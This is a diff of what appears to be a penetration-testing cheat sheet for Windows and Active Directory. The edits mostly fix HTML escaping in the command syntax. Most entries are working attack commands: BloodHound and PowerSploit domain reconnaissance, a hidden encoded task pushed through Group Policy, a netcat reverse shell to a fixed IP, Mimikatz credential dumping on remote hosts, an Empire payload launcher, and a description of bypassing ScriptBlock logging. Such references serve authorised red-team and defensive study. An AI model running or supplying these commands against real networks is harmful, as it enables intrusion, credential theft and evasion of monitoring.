@@ -31,24 +31,24 @@ List Processes Like "owershell"----gwmi win32_process -Filter "name LIKE ‘_owe
 Remote Get-WMIObject Command----Get-WMIObject –ComputerName remotehost –query "Select * from Win32_Service Where Name='LanManServer'" | Format-Table
 
 ##Bloodhound
-EXE Ingestor----.\SharpHound.exe --CollectionMethod All --LDAPUser &lt;UserName&gt; --LDAPPass &lt;Password&gt; --JSONFolder &lt;PathToFile&gt;
-Powershell Ingestor (SharpHound.ps1)----Invoke-BloodHound -CollectionMethod All  -LDAPUser &lt;UserName&gt; -LDAPPass &lt;Password&gt; -OutputDirectory &lt;PathToFile&gt;
+EXE Ingestor----.\SharpHound.exe --CollectionMethod All --LDAPUser <UserName> --LDAPPass <Password> --JSONFolder <PathToFile>
+Powershell Ingestor (SharpHound.ps1)----Invoke-BloodHound -CollectionMethod All  -LDAPUser <UserName> -LDAPPass <Password> -OutputDirectory <PathToFile>
 Start Neo4J and Import Bloodhound Results----##systemctl start neo4j; Navigate to http://127.0.0.1:7373; Configure username and password; ./BloodHound-linux-x64/BloodHound; Authenticate to Neo4j server; Upload the BloodHound.zip file within the GUI.
 
 
 
 ##PowerSploit
-Enumerate User----Get-NetUser &lt;user&gt;
-Enumerate Group----Get-NetGroup &lt;group&gt;
+Enumerate User----Get-NetUser <user>
+Enumerate Group----Get-NetGroup <group>
 Enumerate Computers----Get-NetComputer -FullData
 Enumerate Live Machines----Get-NetComputer -Ping
-Get Groups for which User is member----Get-NetGroup -Username &lt;user&gt;
-Group Members----Get-NetGroupMember &lt;group&gt; -Domain &lt;DomainName&gt;
+Get Groups for which User is member----Get-NetGroup -Username <user>
+Group Members----Get-NetGroupMember <group> -Domain <DomainName>
 Enumerate Domain Shares----Find-DomainShare (-CheckShareAccess)
 Enumerate Group Policies----Get-NetGPO
 Enumerate Group Policy for Specific Computer----Get-NetGPO -ComputerName cpu.local
 Enumerate OUs----Get-NetOU
-Enumerate ACLs----Get-ObjectAcl -SamAccountName &lt;AccountName&gt; -ResolveGUIDs
+Enumerate ACLs----Get-ObjectAcl -SamAccountName <AccountName> -ResolveGUIDs
 Find Interesting ACEs----Invoke-ACLScanner -ResolveGUIDs
 Check ACLs associated with SMB Share----Get-PathAcl -Path "\\Path\to\share"
 Enumerate Domain Trusts----Get-NetDomainTrust
@@ -58,14 +58,14 @@ Find Computers Where DA has Session----Invoke-UserHunter -GroupName "RDPUsers" (
 Apply New ACL----New-Item File.txt | Get-Acl | Set-ACl foobar.ps1
 
 
-Get all effective member of group----Get-NetGroupMember -GroupName &lt;group&gt; -Recurse
-Search the forest global catalog----Get-NetUser -UserName &lt;user&gt; -ADSpath "GC: //domain.com"
+Get all effective member of group----Get-NetGroupMember -GroupName <group> -Recurse
+Search the forest global catalog----Get-NetUser -UserName <user> -ADSpath "GC: //domain.com"
 Find Privileged Machine Accounts----Get-NetGroup -AdminCount | Get-NetGroupMember -Recurse | ?{$_.MemberName -like '*$'}
 
 Find Domain Admins and Users with same first/last name----Get-NetGroupMember -GroupName "Domain Admins" -FullData | %{ $a=$_.displayname.split(" ")[0..1] -join " "; Get-NetUser -Filter "(displayname=*$a*)"} | Select-Object -Property displayname,samaccountname
 New-GPOImmediateTask -TaskName Debugging -GPODisplayName SecurePolicy -CommandArguments '-NoP -NonI -W Hidden -Enc JABXAGMAPQBO...' -Force
 Check Last Password Change----Get-UserProperty -Properties pwdlastset
-Find Logged In Users----Get-NetLoggedOn -ComputerName &lt;ComputerName&gt;
+Find Logged In Users----Get-NetLoggedOn -ComputerName <ComputerName>
 
 Basic NC connectback----powershell.exe -NoExit -Command 'C:/temp/temp2/nc.exe -v 192.168.99.21 4444 -e powershell'
 One-Liner (no script on disk)----Invoke-Expression
@@ -77,7 +77,7 @@ Encoded Commands----##-encodedcommand;-e;-en;-enc
 Dump Creds----Invoke-Mimikatz -DumpCreds -ComputerName remotehost
 Execute Classic Mimikatz Commands----Invoke-Mimikatz -Command '"privilege::debug"'
 
-Empire Powershell Payload----powershell -noP -sta -w1 -enc &lt;base64-encoded-payload&gt;
+Empire Powershell Payload----powershell -noP -sta -w1 -enc <base64-encoded-payload>
 ScriptBlock Logging----Logging feature that captures PS scripts in readable form.  Empire may bypass by unhooking it via "cachedGroupPolicySettings" variable manipulation.  It may also nullify the "suspicious strings" array.  
 
 Query Windows Events----Get-WinEvent -LogName Microsoft-Windows-Sysmon/Operational -MaxEvents 5
